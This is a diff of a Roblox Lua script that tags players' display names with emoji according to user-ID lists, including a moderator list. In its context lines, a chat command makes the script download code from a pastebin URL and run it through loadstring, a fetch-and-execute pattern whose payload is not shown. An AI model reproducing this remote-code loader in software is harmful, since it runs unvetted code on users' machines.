@@ -69,15 +69,67 @@ ModIDS = {
 2369320991,
 }
 
---UPDATED! FULLY WORKING!
---Credits to Luckymaxer, DINOSAURXXX, illremember, fe animations, for helping with the Crouch!
+
+
 
 local Player = game.Players.LocalPlayer
 
 Player.Chatted:connect(function(cht)
 	if cht:match(":benx .") then
 		loadstring(game:HttpGet("https://pastebin.com/raw/Bv3gABeH"))()
-	wait(.5)
+	wait(13)
 end
 end)
 
+--\\ Don't mess with anything below this
+function swagnames()
+    for _,Player in pairs(game:GetService('Players'):GetChildren()) do
+        if table.find(Diamond, Player.UserId) then
+            if Player.Character then
+                if Player.Character.Parent.Name == 'Players' then
+                    Player.Character:FindFirstChildWhichIsA('Humanoid').DisplayName = ('[💎]' .. Player.DisplayName)
+                end
+            end
+        elseif table.find(cucumber, Player.UserId) then
+            if Player.Character then
+                if Player.Character.Parent.Name == 'Players' then
+                    Player.Character:FindFirstChildWhichIsA('Humanoid').DisplayName = ('[🥒]' .. Player.DisplayName)
+                end
+            end
+        elseif table.find(Lighting, Player.UserId) then
+            if Player.Character then
+                if Player.Character.Parent.Name == 'Players' then
+                    Player.Character:FindFirstChildWhichIsA('Humanoid').DisplayName = ('[⚡]' .. Player.DisplayName)
+                end
+            end      
+        elseif table.find(Ghost, Player.UserId) then
+            if Player.Character then
+                if Player.Character.Parent.Name == 'Players' then
+                    Player.Character:FindFirstChildWhichIsA('Humanoid').DisplayName = ('[👻]' .. Player.DisplayName)
+                end
+            end 
+        elseif table.find(ABC, Player.UserId) then
+            if Player.Character then
+                if Player.Character.Parent.Name == 'Players' then
+                    Player.Character:FindFirstChildWhichIsA('Humanoid').DisplayName = ('😂' .. Player.DisplayName)
+                end
+            end 
+        elseif table.find(ModIDS, Player.UserId) then
+            if Player.Character then
+                if Player.Character.Parent.Name == 'Players' then
+                    Player.Character:FindFirstChildWhichIsA('Humanoid').DisplayName = ('[⭐]' .. Player.DisplayName)
+                end
+            end
+        else
+            if Player.Character then
+                if Player.Character.Parent.Name == 'Players' then
+                    if not Player.Character.UpperTorso:FindFirstChild('OriginalSize') then
+                        Player.Character:FindFirstChildWhichIsA('Humanoid').DisplayName = ('[😎]' .. Player.DisplayName)
+                    end
+                end
+            end
+        end
+    end
+end
+local success,err = pcall(swagnames)
+return ModIDS
